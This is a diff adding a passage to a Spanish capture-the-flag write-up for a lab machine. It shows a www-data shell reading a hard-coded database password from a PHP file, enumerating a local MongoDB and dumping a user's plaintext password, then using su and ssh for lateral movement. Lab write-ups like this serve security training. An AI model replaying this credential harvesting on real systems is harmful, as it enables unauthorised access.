@@ -244,7 +244,99 @@ Obtenemos la flag user.txt
 	www-data@sky:/home/webdeveloper$ cat user.txt
 	63191e4ece3752[...]62a5e64d45
 
+Credenciales phpMyAdmin(nos permite loguearnos, no hay nada interesante en la base de datos)
+
+	www-data@sky:/var/www/html/v2$ cat lostpassword.php 
+
+	$con = mysqli_connect('localhost','root','ThisIsSecurePassword!');
+
+Revisando el fichero crontab encontre en el directorio /etc un fichero interesante ----- mongod.conf ----
+
+ 	Contenido del fichero
+
+	   	www-data@sky:/etc$ cat mongod.conf 
+		# mongod.conf
+		
+		# for documentation of all options, see:
+		#   http://docs.mongodb.org/manual/reference/configuration-options/
+		
+		# Where and how to store data.
+		storage:
+		  dbPath: /var/lib/mongodb
+		  journal:
+		    enabled: true
+		#  engine:
+		#  mmapv1:
+		#  wiredTiger:
+		
+		# where to write logging data.
+		systemLog:
+		  destination: file
+		  logAppend: true
+		  path: /var/log/mongodb/mongod.log
+		
+		# network interfaces
+		net:
+		  port: 27017
+		  bindIp: 127.0.0.1
+
+Segun la info obtenida supuestamente esta corriendo un servicio mongodb en el localhost de la maquina en el puerto 27017, lo verificamos.
+
+	www-data@sky:/etc$ ss -tunlp
+	Netid       State        Recv-Q       Send-Q                Local Address:Port               Peer Address:Port       Process                             
+	tcp         LISTEN       0            4096                      127.0.0.1:27017                   0.0.0.0:*                        
+	tcp         LISTEN       0            151                       127.0.0.1:3306                    0.0.0.0:*                        
+
+Nos conectamos al servidor de bases de datos MongoDB
+
+	www-data@sky:/etc$ mongo
+ 
+	MongoDB shell version v4.4.6
+	connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
+	Implicit session: session { "id" : UUID("984b273b-07ad-4a37-a79f-fe4c0def947e") }
+	MongoDB server version: 4.4.6
+	Welcome to the MongoDB shell.
+	For interactive help, type "help".
+ 	[...]
+
+Listamos las bases de datos (Despues de revisar la bases de datos la que nos interesa es backup.)
+
+	> show dbs
+	admin   0.000GB
+	backup  0.000GB
+	config  0.000GB
+	local   0.000GB
 
 
+Seleccionamos la bd y mostramos las tables.
+
+	> use backup
+	switched to db backup
+ 
+	> show collections
+	collection
+	user
+ 
+Mostramos el contenido de user y como podemos ver encontramos unas credenciales para el usuario webdeveloper
+
+	> db.user.find()
+	{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "Baha-----123!@#" }
+
+
+Utilizamos las credenciales encontradas para finalizar la escalada horizontal hacia el usuario webdeveloper, lo podemos hacer por el servicio ssh o con el comando su como mas nos guste.
+
+	www-data@sky:/etc$ su webdeveloper
+	Password: 
+	webdeveloper@sky:/etc$ 
+
+
+	 ──(root㉿kali)-[/home/kali/Desktop/ctf/road]
+	└─# ssh webdeveloper@10.10.121.4
+	The authenticity of host '10.10.121.4 (10.10.121.4)' can't be established.
+	[...]
+	Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
+	webdeveloper@sky:~$ 
+
+## Post Explotacion Escalada de privilegios webdeveloper to root.
 
 
